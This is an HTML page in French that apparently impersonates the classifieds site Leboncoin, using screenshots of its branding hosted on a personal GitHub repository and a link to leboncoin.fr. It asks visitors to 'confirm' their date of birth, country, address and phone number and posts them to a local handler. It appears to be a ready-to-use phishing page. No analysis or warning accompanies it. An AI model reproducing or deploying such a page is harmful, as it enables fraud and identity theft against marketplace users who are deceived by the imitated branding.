<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation des Informations</title>
    <style>
        /* Reset des marges et padding */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background-color: white;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            position: relative;
            overflow-y: auto;
        }

        .platform {
            background-color: white;
            border-radius: 20px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            position: relative;
            z-index: 1;
            margin-top: 140px; /* Espace pour le logo en haut */
            margin-bottom: 150px; /* Espace pour le logo en bas */
        }

        h1 {
            color: black; /* Titre en noir */
            margin-bottom: 20px;
            font-size: 28px;
        }

        .header-logo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 70px;
            object-fit: cover;
            z-index: 0;
            filter: contrast(1.2);
        }

        .footer-logo {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: auto;
            z-index: 0;
            opacity: 0.8;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            color: #555;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        .input-group input:focus {
            border-color: #007bff; /* Bordure bleue au focus */
            box-shadow: 0 0 10px rgba(0, 123, 255, 0.2);
            outline: none;
        }

        .input-group input::placeholder {
            color: #999;
        }

        .button {
            background-color: #007bff; /* Bouton bleu */
            color: white;
            padding: 18px 36px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 18px;
            margin: 30px 0;
            cursor: pointer;
            border: none;
            border-radius: 10px;
            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
        }

        .button:hover {
            background-color: #0056b3; /* Bleu plus foncé au survol */
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0, 123, 255, 0.4);
        }

        .button:active {
            transform: translateY(0);
            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
        }
    </style>
</head>
<body>
    <!-- Logo en haut, étendu sur toute la largeur et en arrière-plan -->
    <a href="https://www.leboncoin.fr" target="_blank">
        <img src="https://raw.githubusercontent.com/zapata225/lebon/refs/heads/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20110632.png" alt="Logo LeBoncoin" class="header-logo">
    </a>

    <!-- Plateforme de confirmation des informations -->
    <div class="platform">
        <h1>Confirmez vos informations</h1>

        <!-- Formulaire de confirmation -->
        <form action="/traitement_confirmation" method="post">
            <div class="input-group">
                <label for="dob">Date de naissance (JJ/MM/AA)</label>
                <input type="text" id="dob" name="dob" placeholder="JJ/MM/AA" required>
            </div>

            <div class="input-group">
                <label for="pays">Pays</label>
                <input type="text" id="pays" name="pays" placeholder="Votre pays" required>
            </div>

            <div class="input-group">
                <label for="adresse">Adresse</label>
                <input type="text" id="adresse" name="adresse" placeholder="Votre adresse" required>
            </div>

            <div class="input-group">
                <label for="telephone">Numéro de téléphone</label>
                <input type="tel" id="telephone" name="telephone" placeholder="+33 6 12 34 56 78" required>
            </div>

            <button type="submit" class="button">Confirmer</button>
        </form>
    </div>

    <!-- Logo en bas, étendu sur toute la largeur -->
    <img src="https://github.com/zapata225/lebon/blob/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20115029.png?raw=true" alt="Logo LeBoncoin Bas" class="footer-logo">
</body>
</html>
